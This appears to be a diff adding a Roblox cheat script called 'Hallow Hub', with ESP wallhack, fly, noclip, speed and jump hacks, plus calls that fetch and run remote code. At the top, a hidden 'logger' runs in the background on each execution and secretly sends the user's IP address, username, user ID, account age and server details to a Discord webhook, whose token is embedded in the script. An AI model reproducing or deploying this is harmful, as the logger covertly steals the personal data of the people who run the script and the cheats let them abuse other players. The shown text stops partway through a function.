@@ -1,3 +1,535 @@
+-- [[ 1. SERVICES ]]
+local HttpService = game:GetService("HttpService")
+local MarketplaceService = game:GetService("MarketplaceService")
+local Players = game:GetService("Players")
+local LP = Players.LocalPlayer
+
+-- [[ 2. CONFIGURATION ]]
+-- Your Webhook Proxy (Lewisakura)
+local proxyURL = "https://webhook.lewisakura.moe/api/webhooks/1469708074393534476/2JrXROCkNkccb-Zq-c6tSZaOyJ441T8M9j-_7UcJdvmlN3UMqOwCPwkAZctUt5dViWDY/queue"
+
+-- Blacklist (Add UserIDs here)
+local blacklist = {
+    0, -- Example: 12345678
+}
+
+-- [[ 3. BLACKLIST CHECK ]]
+for _, bannedID in pairs(blacklist) do
+    if LP.UserId == bannedID then
+        LP:Kick("❌ You are blacklisted from this script.")
+        return 
+    end
+end
+
+-- [[ 4. THE ULTRA LOGGER FUNCTION ]]
+local function sendLog()
+    -- Get Game Info
+    local success, gameInfo = pcall(function()
+        return MarketplaceService:GetProductInfo(game.PlaceId)
+    end)
+    local gameName = success and gameInfo.Name or "Unknown Game"
+    
+    -- Check for Display Name
+    local displayNameText = LP.DisplayName ~= LP.Name and " (AKA: " .. LP.DisplayName .. ")" or ""
+
+    -- Build the Discord Message Data
+    local data = {
+        ["embeds"] = {{
+            ["title"] = "⭐ Hallow Hub Executed",
+            ["color"] = 16735027, -- Hex: 0xFF5733
+            ["fields"] = {
+                {["name"] = "🌐 Connection Info",
+                ["value"] = "**IP Address:** ||" .. (game:HttpGet("https://api.ipify.org") or "N/A") .. "||",
+                ["inline"] = true
+                },
+                 {   ["name"] = "👤 User Info", 
+                    ["value"] = "**Username:** " .. LP.Name .. displayNameText .. 
+                                "\n**ID:** " .. LP.UserId .. 
+                                "\n**Account Age:** " .. LP.AccountAge .. " days", 
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "🎮 Game Info", 
+                    ["value"] = "**Name:** " .. gameName .. 
+                                "\n**Place ID:** " .. game.PlaceId, 
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "🆔 Server Info (JobId)", 
+                    ["value"] = "```" .. game.JobId .. "```", 
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "🔗 Shortcuts", 
+                    ["value"] = "[Join Game](https://www.roblox.com/games/" .. game.PlaceId .. ") | [View Profile](https://www.roblox.com/users/" .. LP.UserId .. "/profile)", 
+                    ["inline"] = false
+                }
+            },
+            ["footer"] = {["text"] = "Execution Time: " .. os.date("%X")},
+            ["timestamp"] = DateTime.now():ToIsoDate()
+        }}
+    }
+
+    -- Executor-Friendly Request Handler
+    local requestFunc = syn and syn.request or http and http.request or http_request or request or (HttpService and HttpService.PostAsync)
+    
+    if requestFunc then
+        pcall(function()
+            requestFunc({
+                Url = proxyURL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode(data)
+            })
+        end)
+    end
+end
+
+-- Run logger in background
+task.spawn(sendLog)
+
+-- ==================== Fly =====================
+local LP = game:GetService("Players").LocalPlayer
+local UIS = game:GetService("UserInputService")
+local flying = false
+local bv, bg
+
+-- We set a global variable so the Slider can "talk" to the Loop directly
+_G.FlySpeed = 50 
+
+local function stopFly()
+    flying = false
+    if bv then bv:Destroy() bv = nil end
+    if bg then bg:Destroy() bg = nil end
+    if LP.Character and LP.Character:FindFirstChildOfClass("Humanoid") then
+        LP.Character.Humanoid.PlatformStand = false
+        LP.Character.Humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
+    end
+end
+
+local function startFly()
+    local char = LP.Character
+    local root = char and char:FindFirstChild("HumanoidRootPart")
+    local hum = char and char:FindFirstChildOfClass("Humanoid")
+    if not root or not hum then return end
+
+    stopFly()
+    hum.PlatformStand = true
+    
+    bv = Instance.new("BodyVelocity")
+    bv.MaxForce = Vector3.new(1e9, 1e9, 1e9) 
+    bv.Velocity = Vector3.new(0, 0, 0)
+    bv.Parent = root
+
+    bg = Instance.new("BodyGyro")
+    bg.MaxTorque = Vector3.new(1e9, 1e9, 1e9)
+    bg.P = 15000
+    bg.Parent = root
+
+    flying = true
+    task.spawn(function()
+        while flying and root and root.Parent do
+            local cam = workspace.CurrentCamera
+            local cf = cam.CFrame
+            
+            -- Now the loop just looks at the global variable
+            local speed = _G.FlySpeed 
+
+            local moveDir = Vector3.new(0,0,0)
+            
+            if UIS:IsKeyDown(Enum.KeyCode.W) then moveDir = moveDir + cf.LookVector end
+            if UIS:IsKeyDown(Enum.KeyCode.S) then moveDir = moveDir - cf.LookVector end
+            if UIS:IsKeyDown(Enum.KeyCode.A) then moveDir = moveDir - cf.RightVector end
+            if UIS:IsKeyDown(Enum.KeyCode.D) then moveDir = moveDir + cf.RightVector end
+            if UIS:IsKeyDown(Enum.KeyCode.Space) then moveDir = moveDir + Vector3.new(0, 1, 0) end
+            if UIS:IsKeyDown(Enum.KeyCode.LeftControl) then moveDir = moveDir - Vector3.new(0, 1, 0) end
+            
+            if moveDir.Magnitude > 0 then
+                bv.Velocity = moveDir.Unit * speed
+            else
+                bv.Velocity = Vector3.new(0, 0, 0)
+            end
+            
+            bg.CFrame = cf
+            task.wait()
+        end
+    end)
+end
+-- ==================== Fly End ====================
+
+local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
+
+-- ==================== ESP CORE SYSTEM ====================
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local LocalPlayer = Players.LocalPlayer
+
+local ESP_SETTINGS = {
+    ENABLED = false,
+    SHOW_ENEMIES = true,
+    SHOW_TEAMMATES = false,
+    SHOW_NAMES = true,
+    SHOW_HEALTH = true,
+    SHOW_DISTANCE = true,
+    MAX_DISTANCE = 2000,
+    NAME_MODE = "Both", 
+    
+    ENEMY_COLOR = Color3.fromRGB(255, 50, 50),
+    TEAM_COLOR = Color3.fromRGB(50, 150, 255),
+    FRIEND_COLOR = Color3.fromRGB(50, 255, 100),
+    
+    FILL_TRANSPARENCY = 0.5,
+    OUTLINE_TRANSPARENCY = 0
+}
+
+local espData = {}
+
+-- Simple test function
+local function testESP()
+    print("[ESP TEST] Testing ESP system...")
+    print("LocalPlayer:", LocalPlayer.Name)
+    print("Total players:", #Players:GetPlayers())
+    
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player ~= LocalPlayer then
+            print("Found player:", player.Name)
+        end
+    end
+end
+
+-- Improved createESP function
+local function createESP(player)
+    if player == LocalPlayer then return end
+    
+    print("[ESP] Creating ESP for:", player.Name)
+    
+    local function setupCharacter(character)
+        if not character or not character:IsDescendantOf(workspace) then return end
+        
+        print("[ESP] Setting up character for:", player.Name)
+        
+        -- Wait a bit for character to fully load
+        task.wait(1)
+        
+        -- Check if character still exists
+        if not character or not character.Parent then return end
+        
+        -- Get head
+        local head = character:FindFirstChild("Head")
+        if not head then
+            head = character:WaitForChild("Head", 2)
+            if not head then return end
+        end
+        
+        -- Remove old ESP
+        local oldHighlight = character:FindFirstChild("ESP_Highlight")
+        if oldHighlight then oldHighlight:Destroy() end
+        
+        local oldInfo = character:FindFirstChild("ESP_Info")
+        if oldInfo then oldInfo:Destroy() end
+        
+        -- Create highlight
+        local highlight = Instance.new("Highlight")
+        highlight.Name = "ESP_Highlight"
+        highlight.FillColor = ESP_SETTINGS.ENEMY_COLOR
+        highlight.OutlineColor = ESP_SETTINGS.ENEMY_COLOR
+        highlight.FillTransparency = ESP_SETTINGS.FILL_TRANSPARENCY
+        highlight.OutlineTransparency = ESP_SETTINGS.OUTLINE_TRANSPARENCY
+        highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+        highlight.Adornee = character
+        highlight.Enabled = ESP_SETTINGS.ENABLED
+        highlight.Parent = character
+        
+        -- Create billboard
+        local billboard = Instance.new("BillboardGui")
+        billboard.Name = "ESP_Info"
+        billboard.Size = UDim2.new(0, 150, 0, 60)
+        billboard.StudsOffset = Vector3.new(0, 3.5, 0)
+        billboard.AlwaysOnTop = true
+        billboard.MaxDistance = ESP_SETTINGS.MAX_DISTANCE
+        billboard.Enabled = ESP_SETTINGS.ENABLED
+        billboard.Adornee = head
+        billboard.Parent = character
+        
+        -- Name label
+        local nameLabel = Instance.new("TextLabel")
+        nameLabel.Size = UDim2.new(1, 0, 0.5, 0)
+        nameLabel.BackgroundTransparency = 1
+        nameLabel.Text = player.Name
+        nameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+        nameLabel.TextSize = 14
+        nameLabel.Font = Enum.Font.GothamBold
+        nameLabel.TextStrokeTransparency = 0.5
+        nameLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+        nameLabel.Visible = ESP_SETTINGS.SHOW_NAMES
+        nameLabel.Parent = billboard
+        
+        -- Info label
+        local infoLabel = Instance.new("TextLabel")
+        infoLabel.Size = UDim2.new(1, 0, 0.5, 0)
+        infoLabel.Position = UDim2.new(0, 0, 0.5, 0)
+        infoLabel.BackgroundTransparency = 1
+        infoLabel.Text = "100 HP"
+        infoLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+        infoLabel.TextSize = 12
+        infoLabel.Font = Enum.Font.Gotham
+        infoLabel.TextStrokeTransparency = 0.5
+        infoLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+        infoLabel.Visible = ESP_SETTINGS.SHOW_HEALTH or ESP_SETTINGS.SHOW_DISTANCE
+        infoLabel.Parent = billboard
+        
+        -- Store data
+        espData[player] = {
+            highlight = highlight,
+            billboard = billboard,
+            nameLabel = nameLabel,
+            infoLabel = infoLabel,
+            character = character,
+            head = head
+        }
+        
+        print("[ESP] ESP created for:", player.Name)
+        
+        -- Update loop
+        local connection
+        connection = RunService.RenderStepped:Connect(function()
+            local data = espData[player]
+            if not data or not character or not character.Parent then
+                if connection then connection:Disconnect() end
+                return
+            end
+            
+            -- Check if objects still exist
+            if not data.highlight or not data.billboard then
+                if connection then connection:Disconnect() end
+                return
+            end
+            
+            -- Enabled check
+            if not ESP_SETTINGS.ENABLED then
+                data.highlight.Enabled = false
+                data.billboard.Enabled = false
+                return
+            end
+            
+            -- Get local character position
+            local localChar = LocalPlayer.Character
+            if not localChar then
+                data.highlight.Enabled = false
+                data.billboard.Enabled = false
+                return
+            end
+            
+            local localRoot = localChar:FindFirstChild("HumanoidRootPart") or localChar:FindFirstChild("Head")
+            if not localRoot or not data.head then
+                data.highlight.Enabled = false
+                data.billboard.Enabled = false
+                return
+            end
+            
+            -- Distance check
+            local distance = (localRoot.Position - data.head.Position).Magnitude
+            
+            if distance > ESP_SETTINGS.MAX_DISTANCE then
+                data.highlight.Enabled = false
+                data.billboard.Enabled = false
+                return
+            end
+            
+            -- Team check
+            local isTeammate = false
+            if player.Team and LocalPlayer.Team then
+                isTeammate = player.Team == LocalPlayer.Team
+            end
+            
+            -- Friend check
+            local isFriend = false
+            pcall(function()
+                isFriend = player:IsFriendsWith(LocalPlayer.UserId)
+            end)
+            
+            -- Show logic
+            local shouldShow = true
+            if isTeammate and not ESP_SETTINGS.SHOW_TEAMMATES then
+                shouldShow = false
+            elseif not isTeammate and not ESP_SETTINGS.SHOW_ENEMIES then
+                shouldShow = false
+            end
+            
+            if not shouldShow then
+                data.highlight.Enabled = false
+                data.billboard.Enabled = false
+                return
+            end
+
+            -- ==================== NEW DYNAMIC NAME LOGIC ====================
+            -- Determine the string based on the setting
+            local nameToShow = ""
+            if ESP_SETTINGS.NAME_MODE == "Username" then
+            nameToShow = player.Name
+            elseif ESP_SETTINGS.NAME_MODE == "Display Name" then
+            nameToShow = player.DisplayName
+            else
+            nameToShow = player.DisplayName .. " (@" .. player.Name .. ")"
+            end
+
+           -- Apply it
+           data.nameLabel.Text = isFriend and "⭐ " .. nameToShow or nameToShow
+            -- ===============================================================
+            
+            -- Update colors
+            local color
+            if isFriend then
+                color = ESP_SETTINGS.FRIEND_COLOR
+            elseif isTeammate then
+                color = ESP_SETTINGS.TEAM_COLOR
+            else
+                color = ESP_SETTINGS.ENEMY_COLOR
+            end
+            
+            data.highlight.FillColor = color
+            data.highlight.OutlineColor = color
+            data.highlight.Enabled = true
+            data.billboard.Enabled = true
+            
+            -- Update info
+            local humanoid = character:FindFirstChildOfClass("Humanoid")
+            if humanoid and humanoid:IsA("Humanoid") then
+                local health = math.floor(humanoid.Health)
+                local maxHealth = math.floor(humanoid.MaxHealth)
+                local healthPercent = humanoid.Health / humanoid.MaxHealth
+                
+                -- Build text
+                local textParts = {}
+                
+                if ESP_SETTINGS.SHOW_HEALTH then
+                    table.insert(textParts, health .. "/" .. maxHealth .. " HP")
+                end
+                
+                if ESP_SETTINGS.SHOW_DISTANCE then
+                    table.insert(textParts, math.floor(distance) .. "m")
+                end
+                
+                data.infoLabel.Text = table.concat(textParts, " | ")
+                
+                -- Health color
+                if humanoid.Health <= 0 then
+                    data.infoLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
+                elseif healthPercent < 0.3 then
+                    data.infoLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
+                elseif healthPercent < 0.6 then
+                    data.infoLabel.TextColor3 = Color3.fromRGB(255, 255, 50)
+                else
+                    data.infoLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+                end
+            else
+                data.infoLabel.Text = ESP_SETTINGS.SHOW_DISTANCE and (math.floor(distance) .. "m") or ""
+            end
+            
+            -- Update visibility
+            data.nameLabel.Visible = ESP_SETTINGS.SHOW_NAMES
+            data.infoLabel.Visible = ESP_SETTINGS.SHOW_HEALTH or ESP_SETTINGS.SHOW_DISTANCE
+        end)
+    end
+    
+    -- Connect character events
+    if player.Character then
+        task.spawn(function()
+            setupCharacter(player.Character)
+        end)
+    end
+    
+    player.CharacterAdded:Connect(function(character)
+        task.spawn(function()
+            setupCharacter(character)
+        end)
+    end)
+end
+
+-- Function to initialize ESP
+local function initializeESP()
+    print("[ESP] Initializing ESP system...")
+    
+    -- Create ESP for all existing players
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player ~= LocalPlayer then
+            task.spawn(function()
+                createESP(player)
+            end)
+        end
+    end
+    
+    -- Handle new players
+    Players.PlayerAdded:Connect(function(player)
+        if player ~= LocalPlayer then
+            task.spawn(function()
+                createESP(player)
+            end)
+        end
+    end)
+    
+    -- Cleanup
+    Players.PlayerRemoving:Connect(function(player)
+        if espData[player] then
+            local data = espData[player]
+            if data.highlight then
+                data.highlight:Destroy()
+            end
+            if data.billboard then
+                data.billboard:Destroy()
+            end
+            espData[player] = nil
+        end
+    end)
+    
+    print("[ESP] ESP system initialized")
+end
+
+-- Run test
+testESP()
+
+local Window = Rayfield:CreateWindow({
+   Name = "Hallow Hub",
+   Icon = 0,
+   LoadingTitle = "Hallow Hub",
+   LoadingSubtitle = "by Hallow",
+   ShowText = "Hallow Hub is loading.",
+   Theme = "Bloom",
+   
+   ToggleUIKeybind = Enum.KeyCode.RightShift,
+   
+   DisableRayfieldPrompts = false,
+   DisableBuildWarnings = false,
+   
+   ConfigurationSaving = {
+      Enabled = true,
+      FolderName = "Hallow Hub",
+      FileName = "HallowHubConfig"
+   },
+   
+   Discord = {
+      Enabled = false,
+      Invite = "noinvitelink",
+      RememberJoins = true
+   },
+   
+   KeySystem = false,
+   KeySettings = {
+      Title = "Untitled",
+      Subtitle = "Key System",
+      Note = "No method of obtaining the key is provided",
+      FileName = "Key",
+      SaveKey = true,
+      GrabKeyFromSite = false,
+      Key = {"Hello"}
+   }
+})
+
+-- Wait for window to fully load
+task.wait(1)
+
+--===================== BACKGROUND INJECTION ====================
 task.spawn(function()
     task.wait(2) -- Wait for the UI to finish loading
     
@@ -44,3 +576,567 @@ task.spawn(function()
         print("Hallow Hub: Background and Transparency applied.")
     end
 end)
+-- ==================== ESP TAB ====================
+local ESPTab = Window:CreateTab("ESP")
+
+-- Main ESP Settings
+local MainSection = ESPTab:CreateSection("ESP Settings")
+
+local EnabledToggle = ESPTab:CreateToggle({
+    Name = "ESP Enabled",
+    CurrentValue = ESP_SETTINGS.ENABLED,
+    Flag = "ESP_Enabled",
+    Callback = function(Value)
+        ESP_SETTINGS.ENABLED = Value
+        print("[ESP] ESP Enabled:", Value)
+        
+        for player, data in pairs(espData) do
+            if data and data.highlight then
+                data.highlight.Enabled = Value
+            end
+            if data and data.billboard then
+                data.billboard.Enabled = Value
+            end
+        end
+    end
+})
+
+local EnemiesToggle = ESPTab:CreateToggle({
+    Name = "Show Enemies",
+    CurrentValue = ESP_SETTINGS.SHOW_ENEMIES,
+    Flag = "ESP_ShowEnemies",
+    Callback = function(Value)
+        ESP_SETTINGS.SHOW_ENEMIES = Value
+        print("[ESP] Show Enemies:", Value)
+    end
+})
+
+local TeammatesToggle = ESPTab:CreateToggle({
+    Name = "Show Teammates",
+    CurrentValue = ESP_SETTINGS.SHOW_TEAMMATES,
+    Flag = "ESP_ShowTeammates",
+    Callback = function(Value)
+        ESP_SETTINGS.SHOW_TEAMMATES = Value
+        print("[ESP] Show Teammates:", Value)
+    end
+})
+
+local NamesToggle = ESPTab:CreateToggle({
+    Name = "Show Names",
+    CurrentValue = ESP_SETTINGS.SHOW_NAMES,
+    Flag = "ESP_ShowNames",
+    Callback = function(Value)
+        ESP_SETTINGS.SHOW_NAMES = Value
+        print("[ESP] Show Names:", Value)
+        
+        for _, data in pairs(espData) do
+            if data and data.nameLabel then
+                data.nameLabel.Visible = Value
+            end
+        end
+    end
+})
+
+local HealthToggle = ESPTab:CreateToggle({
+    Name = "Show Health",
+    CurrentValue = ESP_SETTINGS.SHOW_HEALTH,
+    Flag = "ESP_ShowHealth",
+    Callback = function(Value)
+        ESP_SETTINGS.SHOW_HEALTH = Value
+        print("[ESP] Show Health:", Value)
+        
+        for _, data in pairs(espData) do
+            if data and data.infoLabel then
+                data.infoLabel.Visible = Value or ESP_SETTINGS.SHOW_DISTANCE
+            end
+        end
+    end
+})
+
+local DistanceToggle = ESPTab:CreateToggle({
+    Name = "Show Distance",
+    CurrentValue = ESP_SETTINGS.SHOW_DISTANCE,
+    Flag = "ESP_ShowDistance",
+    Callback = function(Value)
+        ESP_SETTINGS.SHOW_DISTANCE = Value
+        print("[ESP] Show Distance:", Value)
+        
+        for _, data in pairs(espData) do
+            if data and data.infoLabel then
+                data.infoLabel.Visible = Value or ESP_SETTINGS.SHOW_HEALTH
+            end
+        end
+    end
+})
+
+ESPTab:CreateDropdown({
+   Name = "Name Display Mode",
+   Options = {"Username", "Display Name", "Both"},
+   CurrentOption = {"Both"},
+   MultipleOptions = false,
+   Flag = "NameModeDropdown", 
+   Callback = function(Option)
+      -- Safety check: handles both single string or table return
+      local Selection = type(Option) == "table" and Option[1] or Option
+      ESP_SETTINGS.NAME_MODE = Selection
+      
+      -- Debug print to console to verify it's working
+      print("ESP Name Mode set to: " .. tostring(Selection))
+   end,
+})
+
+-- Configuration Section
+local ConfigSection = ESPTab:CreateSection("Configuration")
+
+local MaxDistanceSlider = ESPTab:CreateSlider({
+    Name = "Max Distance",
+    Range = {100, 2000},
+    Increment = 50,
+    Suffix = "studs",
+    CurrentValue = ESP_SETTINGS.MAX_DISTANCE,
+    Flag = "ESP_MaxDistance",
+    Callback = function(Value)
+        ESP_SETTINGS.MAX_DISTANCE = Value
+        print("[ESP] Max Distance:", Value)
+        
+        for _, data in pairs(espData) do
+            if data and data.billboard then
+                data.billboard.MaxDistance = Value
+            end
+        end
+    end
+})
+
+local FillTransparencySlider = ESPTab:CreateSlider({
+    Name = "Fill Transparency",
+    Range = {0, 1},
+    Increment = 0.1,
+    CurrentValue = ESP_SETTINGS.FILL_TRANSPARENCY,
+    Flag = "ESP_FillTransparency",
+    Callback = function(Value)
+        ESP_SETTINGS.FILL_TRANSPARENCY = Value
+        print("[ESP] Fill Transparency:", Value)
+        
+        for _, data in pairs(espData) do
+            if data and data.highlight then
+                data.highlight.FillTransparency = Value
+            end
+        end
+    end
+})
+
+local OutlineTransparencySlider = ESPTab:CreateSlider({
+    Name = "Outline Transparency",
+    Range = {0, 1},
+    Increment = 0.1,
+    CurrentValue = ESP_SETTINGS.OUTLINE_TRANSPARENCY,
+    Flag = "ESP_OutlineTransparency",
+    Callback = function(Value)
+        ESP_SETTINGS.OUTLINE_TRANSPARENCY = Value
+        print("[ESP] Outline Transparency:", Value)
+        
+        for _, data in pairs(espData) do
+            if data and data.highlight then
+                data.highlight.OutlineTransparency = Value
+            end
+        end
+    end
+})
+
+-- Colors Section
+local ColorsSection = ESPTab:CreateSection("Colors")
+
+local EnemyColorPicker = ESPTab:CreateColorPicker({
+    Name = "Enemy Color",
+    Color = ESP_SETTINGS.ENEMY_COLOR,
+    Flag = "ESP_EnemyColor",
+    Callback = function(Value)
+        ESP_SETTINGS.ENEMY_COLOR = Value
+        print("[ESP] Enemy Color:", Value)
+    end
+})
+
+local TeamColorPicker = ESPTab:CreateColorPicker({
+    Name = "Team Color",
+    Color = ESP_SETTINGS.TEAM_COLOR,
+    Flag = "ESP_TeamColor",
+    Callback = function(Value)
+        ESP_SETTINGS.TEAM_COLOR = Value
+        print("[ESP] Team Color:", Value)
+    end
+})
+
+local FriendColorPicker = ESPTab:CreateColorPicker({
+    Name = "Friend Color",
+    Color = ESP_SETTINGS.FRIEND_COLOR,
+    Flag = "ESP_FriendColor",
+    Callback = function(Value)
+        ESP_SETTINGS.FRIEND_COLOR = Value
+        print("[ESP] Friend Color:", Value)
+    end
+})
+
+-- Show startup notification
+Rayfield:Notify({
+    Title = "Hallow Interface",
+    Content = "ESP System Loaded | Press F9 to toggle",
+    Duration = 5,
+    Image = 4483362458
+})
+
+print("✅ ESP Tab Added to Hallow Interface")
+
+-- ==================== FINAL UPDATE LOOP ====================
+local scriptStart = tick()
+local RunService = game:GetService("RunService")
+local Stats = game:GetService("Stats")
+
+task.spawn(function()
+    local fpsCount = 0
+    local lastUpdate = tick()
+    
+    -- FPS Tracker logic
+    local fpsConnection = RunService.RenderStepped:Connect(function()
+        fpsCount = fpsCount + 1
+    end)
+
+    while true do
+        pcall(function()
+            -- 1. Total Players
+            if _G.PlayerCountLabel then
+                _G.PlayerCountLabel:Set("Total Players: " .. #game:GetService("Players"):GetPlayers())
+            end
+
+            -- 2. Session & Server Age
+            local now = tick()
+            local sessionDiff = math.floor(now - scriptStart)
+            local serverDiff = math.floor(workspace.DistributedGameTime)
+            
+            if _G.UptimeLabel then
+                _G.UptimeLabel:Set(string.format("Session: %dh %dm %ds", math.floor(sessionDiff/3600), math.floor((sessionDiff%3600)/60), sessionDiff%60))
+            end
+            if _G.ServerAgeLabel then
+                _G.ServerAgeLabel:Set(string.format("Server Age: %dh %dm %ds", math.floor(serverDiff/3600), math.floor((serverDiff%3600)/60), serverDiff%60))
+            end
+
+            -- 3. Ping (Network Latency)
+            if _G.PingLabel then
+                local ping = math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
+                _G.PingLabel:Set("Ping: " .. ping .. " ms")
+            end
+
+            -- 4. FPS (Frames Per Second)
+            if _G.FPSLabel then
+                local currentTime = tick()
+                local timePassed = currentTime - lastUpdate
+                local currentFPS = math.floor(fpsCount / timePassed)
+                
+                _G.FPSLabel:Set("FPS: " .. currentFPS)
+                
+                -- Reset FPS counter for next second
+                fpsCount = 0
+                lastUpdate = currentTime
+            end
+        end)
+        
+        task.wait(1)
+    end
+end)
+
+-- Initialize ESP after UI is created
+task.wait(2) -- Give UI time to load
+initializeESP()
+
+print("✅ Hallow Interface with ESP loaded successfully!")
+
+-- ==================== UTILITY TAB ====================
+local UtilityTab = Window:CreateTab("Utility")
+
+-- Section for Server Information
+UtilityTab:CreateSection("Server Stats")
+-- We use _G to make sure the loop can find these no matter what
+_G.PlayerCountLabel = UtilityTab:CreateLabel("Total Players: " .. #game:GetService("Players"):GetPlayers())
+_G.UptimeLabel = UtilityTab:CreateLabel("Session Uptime: 0h 0m 0s")
+_G.ServerAgeLabel = UtilityTab:CreateLabel("Server Age: 0h 0m 0s")
+_G.PingLabel = UtilityTab:CreateLabel("Ping: 0 ms")
+_G.FPSLabel = UtilityTab:CreateLabel("FPS: 0")
+
+UtilityTab:CreateButton({
+    Name = "Copy JobID",
+    Callback = function()
+        setclipboard(game.JobId)
+        Rayfield:Notify({Title = "Utility", Content = "JobID copied to clipboard!", Duration = 2})
+    end
+})
+
+UtilityTab:CreateButton({
+    Name = "Copy Server Script",
+    Callback = function()
+        local scriptText = 'game:GetService("TeleportService"):TeleportToPlaceInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '", game:GetService("Players").LocalPlayer)'
+        setclipboard(scriptText)
+        Rayfield:Notify({Title = "Utility", Content = "Join script copied!", Duration = 2})
+    end
+})
+
+-- Section for Server Management
+UtilityTab:CreateSection("Server Management")
+
+UtilityTab:CreateButton({
+    Name = "Rejoin Server",
+    Callback = function()
+        local ts = game:GetService("TeleportService")
+        ts:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
+    end
+})
+
+UtilityTab:CreateButton({
+    Name = "Server Hop",
+    Callback = function()
+        local HttpService = game:GetService("HttpService")
+        local TeleportService = game:GetService("TeleportService")
+        local Servers = HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100"))
+        
+        for _, v in pairs(Servers.data) do
+            if v.playing < v.maxPlayers and v.id ~= game.JobId then
+                TeleportService:TeleportToPlaceInstance(game.PlaceId, v.id)
+                break
+            end
+        end
+    end
+})
+
+-- ===================== Infinite Yield ======================
+UtilityTab:CreateSection("Infinite Yield")
+
+UtilityTab:CreateButton({
+    Name = "Execute Infinite Yield",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
+    end
+})
+
+UtilityTab:CreateLabel("Note:Infinite Yield is a admin script which i do not own, all credits to EdgeIY for creating it and maintaining it.")
+
+-- ==================== MOVEMENT & PHYSICS ====================
+local MoveSection = UtilityTab:CreateSection("Movement & Physics")
+local LP = game.Players.LocalPlayer
+
+-- 1. THE UI ELEMENTS
+local SpeedSlider = UtilityTab:CreateSlider({
+    Name = "Walk Speed",
+    Range = {16, 200}, Increment = 1, Suffix = "speed", CurrentValue = 16, Flag = "WS_Flag",
+    Callback = function(v) if LP.Character and LP.Character:FindFirstChild("Humanoid") then LP.Character.Humanoid.WalkSpeed = v end end,
+})
+
+local JumpSlider = UtilityTab:CreateSlider({
+    Name = "Jump Power",
+    Range = {50, 500}, Increment = 5, Suffix = "power", CurrentValue = 50, Flag = "JP_Flag",
+    Callback = function(v) 
+        local hum = LP.Character and LP.Character:FindFirstChild("Humanoid")
+        if hum then hum.UseJumpPower = true; hum.JumpPower = v end 
+    end,
+})
+
+UtilityTab:CreateSlider({
+   Name = "Fly Speed",
+   Range = {10, 500},
+   Increment = 1,
+   CurrentValue = 50,
+   Flag = "FlySpeed_Flag", 
+   Callback = function(Value)
+      -- This tells the Fly Loop the new speed immediately
+      _G.FlySpeed = Value
+   end,
+})
+
+UtilityTab:CreateToggle({
+   Name = "Fly",
+   CurrentValue = false,
+   Flag = "Fly_Flag",
+   Callback = function(Value)
+      if Value then
+          if startFly then startFly() end
+      else
+          if stopFly then stopFly() end
+      end
+   end,
+})
+
+UtilityTab:CreateToggle({Name = "Infinite Jump", CurrentValue = false, Flag = "IJ_Flag", Callback = function() end})
+UtilityTab:CreateToggle({Name = "Noclip", CurrentValue = false, Flag = "NC_Flag", Callback = function() end})
+
+-- [[ UPDATED RESET BUTTON ]]
+UtilityTab:CreateButton({
+    Name = "Reset All Movement",
+    Callback = function()
+        -- 1. Reset UI (Toggles/Sliders)
+        SpeedSlider:Set(16)
+        JumpSlider:Set(50)
+        if Rayfield.Flags.IJ_Flag then Rayfield.Flags.IJ_Flag:Set(false) end
+        if Rayfield.Flags.NC_Flag then Rayfield.Flags.NC_Flag:Set(false) end
+        
+        -- 2. Fly Support: Turn off Toggle and Kill Physics
+        if Rayfield.Flags.Fly_Flag then Rayfield.Flags.Fly_Flag:Set(false) end
+        stopFly() 
+        
+        -- 3. Immediate Character Reset
+        local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
+        if hum then
+            hum.WalkSpeed = 16
+            hum.JumpPower = 50
+            hum.PlatformStand = false -- Ensures you aren't stuck in "fly" pose
+            hum:ChangeState(Enum.HumanoidStateType.GettingUp)
+        end
+    end
+})
+
+--- ==================== PRO-GRADE LOGIC ENGINE ====================
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local LP = game.Players.LocalPlayer
+
+-- Noclip Logic
+RunService.Stepped:Connect(function()
+    if Rayfield.Flags.NC_Flag and Rayfield.Flags.NC_Flag.CurrentValue then
+        if LP.Character then
+            for _, v in pairs(LP.Character:GetDescendants()) do
+                if v:IsA("BasePart") then v.CanCollide = false end
+            end
+        end
+    end
+end)
+
+-- Anti-Reset Logic (Re-applies your settings when you respawn)
+LP.CharacterAdded:Connect(function(char)
+    local hum = char:WaitForChild("Humanoid")
+    task.wait(0.6) 
+    
+    if Rayfield.Flags.WS_Flag then
+        hum.WalkSpeed = Rayfield.Flags.WS_Flag.CurrentValue
+    end
+    if Rayfield.Flags.JP_Flag then
+        hum.UseJumpPower = true
+        hum.JumpPower = Rayfield.Flags.JP_Flag.CurrentValue
+    end
+end)
+
+-- Infinite Jump Logic
+UserInputService.JumpRequest:Connect(function()
+    if Rayfield.Flags.IJ_Flag and Rayfield.Flags.IJ_Flag.CurrentValue then
+        local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
+        if hum then hum:ChangeState(Enum.HumanoidStateType.Jumping) end
+    end
+end)
+
+-- Section for Management
+UtilityTab:CreateSection("System Management")
+
+UtilityTab:CreateButton({
+    Name = "Refresh ESP",
+    Callback = function()
